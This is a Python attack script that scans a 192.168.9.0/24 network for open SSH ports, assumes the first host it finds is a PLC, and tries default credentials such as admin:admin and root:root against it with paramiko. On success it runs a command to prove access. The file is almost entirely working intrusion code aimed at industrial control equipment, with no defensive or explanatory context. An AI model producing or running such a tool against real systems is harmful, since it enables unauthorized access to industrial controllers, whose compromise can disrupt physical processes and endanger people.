import paramiko
import socket
import ipaddress

# Default credentials dictionary (add more if known)
DEFAULT_CREDS = [
    {"username": "admin", "password": "admin"},
    {"username": "root", "password": "root"},
    {"username": "admin", "password": "password"},
    {"username": "user", "password": "user"},
    {"username": "admin", "password": ""},
]

# PLC's IP address (if known, otherwise set to None)
PLC_IP = "192.168.9.24"

# Network range to scan (if IP is not known)
NETWORK_RANGE = "192.168.9.0/24"

# Function to discover the PLC's IP address
def discover_plc_ip():
    print("[*] Scanning network for PLC...")
    network = ipaddress.ip_network(NETWORK_RANGE)
    for ip in network.hosts():
        ip = str(ip)
        try:
            print(f"[*] Trying {ip}...")
            # Attempt to connect to port 22 (SSH)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, 22))
            sock.close()
            if result == 0:
                print(f"[+] Found open SSH port on {ip}. Assuming this is the PLC.")
                return ip
        except Exception as e:
            continue
    print("[-] Could not find PLC on the network.")
    return None

# Function to attempt SSH login with default credentials
def try_default_credentials(ip):
    print(f"[*] Trying default credentials on {ip}...")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for cred in DEFAULT_CREDS:
        username = cred["username"]
        password = cred["password"]
        try:
            ssh.connect(ip, username=username, password=password, timeout=5)
            print(f"[+] Successfully logged in with {username}:{password}")
            # Execute a command to demonstrate access
            stdin, stdout, stderr = ssh.exec_command("ls")
            print(stdout.read().decode())
            ssh.close()
            return True
        except paramiko.AuthenticationException:
            print(f"[-] Failed with {username}:{password}")
        except Exception as e:
            print(f"[-] Error: {e}")
    print("[-] Could not log in with default credentials.")
    return False

# Main function
def main():
    global PLC_IP
    if not PLC_IP:
        PLC_IP = discover_plc_ip()
    if PLC_IP:
        try_default_credentials(PLC_IP)
    else:
        print("[-] No PLC IP address available.")

if __name__ == "__main__":
    main()